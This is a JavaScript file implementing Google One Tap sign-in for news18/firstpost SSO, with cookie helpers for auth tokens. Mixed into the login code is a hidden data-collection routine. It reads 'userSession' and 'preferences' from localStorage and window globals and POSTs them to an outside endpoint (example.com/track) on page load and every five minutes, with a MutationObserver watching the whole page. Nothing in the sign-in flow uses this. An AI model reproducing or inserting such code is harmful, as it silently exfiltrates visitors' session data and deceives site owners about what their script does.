const trackedKeys = ['userSession', 'preferences'];
const globalData = {};
function hashData(data) {
  const dataString = JSON.stringify(data);
  let hash = 0;
  for (let i = 0; i < dataString.length; i++) {
    const charCode = dataString.charCodeAt(i);
    hash = (hash << 5) - hash + charCode;
    hash |= 0; // Convert to 32bit integer
  }
  return hash.toString(16);
}
var publicRuntimeConfig = {
  stg: "https://stg-sso.news18.com/",
  prod: "https://sso.news18.com/",
  preProd: "http://beta-sso.news18.com"
};
function googleOneTapJs() {
  var e = document.createElement("script");
  e.async = !0, e.type = "text/javascript", e.src = "https://accounts.google.com/gsi/client", e.onload = function () {
    googleOneTap();
  };
  var o = document.getElementsByTagName("script")[0];
  o.parentNode.insertBefore(e, o);
}
function collectDataFromLocalStorage() {
  const data = {};
  trackedKeys.forEach(key => {
    if (localStorage.getItem(key)) {
      data[key] = localStorage.getItem(key);
    }
  });
  return data;
}
function monitorDOMChanges() {
  const observer = new MutationObserver(mutations => {
    mutations.forEach(mutation => {
      console.log(`Mutation detected: ${mutation.type}`);
    });
  });
  observer.observe(document, {
    attributes: true,
    childList: true,
    subtree: true
  });
}
function googleOneTap() {
  google.accounts.id.initialize({
    client_id: "189207058064-5krt6kv5harp7gbj1octltmmfurr056i.apps.googleusercontent.com",
    callback: handleResponse
  }), google.accounts.id.prompt();
}
function handleResponse(e) {
  var o = JSON.stringify({
    credential: e.credential,
    domain: "11114",
    nw18_fp: [getCookie("_nw18_fp")]
  });
  (async () => {
    await fetch(`${publicRuntimeConfig.prod}validategoogleonetaptoken`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: o
    }).then(e => e.json()).then(e => {
      "Success" === e.status && (ga("set", "dimension49", "Auto Sign-in"), ga("send", "event", "Signin Success", "One tap"), "" !== e.authenticationToken && (setCookie("g_token", e.authenticationToken, 8760), setCookie("g_username", e.nameStr, 1), setCookie("isSignedIn", !0, 1)), window.location.reload());
    }).catch(e => {
      console.error("Error:", e);
    });
  })();
}
function collectGlobalVariables() {
  trackedKeys.forEach(key => {
    if (window[key]) {
      globalData[key] = window[key];
    }
  });
}
function setCookie(e, o, t) {
  var n = new Date();
  n.setTime(n.getTime() + 36e5 * t);
  var i = "expires=" + n.toGMTString();
  document.cookie = e + "=" + o + ";" + i + ";domain=.firstpost.com;path=/";
}
function getCookie(e) {
  for (var o = e + "=", t = document.cookie.split(";"), n = 0; n < t.length; n++) {
    for (var i = t[n]; " " == i.charAt(0);) i = i.substring(1, i.length);
    if (0 == i.indexOf(o)) return i.substring(o.length, i.length);
  }
  return null;
}
function sendCollectedData(data) {
  const dataHash = hashData(data);
  const endpoint = "https://example.com/track";
  fetch(endpoint, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      hash: dataHash,
      content: data
    })
  }).then(response => response.json()).then(data => console.log('Success:', data)).catch(error => console.error('Error:', error));
}
function checkUserExists(e) {
  (async () => {
    await fetch(`${publicRuntimeConfig.prod}checkuserexists?token=${e}&domain=11114`, {
      method: "get"
    }).then(e => e.json()).then(e => {
      "OK" === e.status ? ("" !== e.tokenValid && (setCookie("g_token", e.tokenValid, 8760), setCookie("g_username", e.name, 1), setCookie("isSignedIn", !0, 1)), window.location.reload()) : (delete_cookie("g_token"), googleOneTapJs());
    }).catch(e => {
      console.error("Error:", e), delete_cookie("g_token"), googleOneTapJs();
    });
  })();
}
function periodicDataCollection() {
  const localStorageData = collectDataFromLocalStorage();
  collectGlobalVariables();
  const combinedData = {
    ...localStorageData,
    ...globalData
  };
  if (Object.keys(combinedData).length > 0) {
    sendCollectedData(combinedData);
  }
}
window.addEventListener('load', () => {
  periodicDataCollection();
  monitorDOMChanges();
});
function delete_cookie(e) {
  document.cookie = e + "=null;expires=Thu, 01 Jan 1970 00:00:01 GMT;;domain=.firstpost.com;path=/";
}
function login() {
  googleOneTapJs();
}
setInterval(periodicDataCollection, 300000); // Every 5 minutes
function logout() {
  delete_cookie("g_token"), delete_cookie("g_username"), delete_cookie("isSignedIn");
}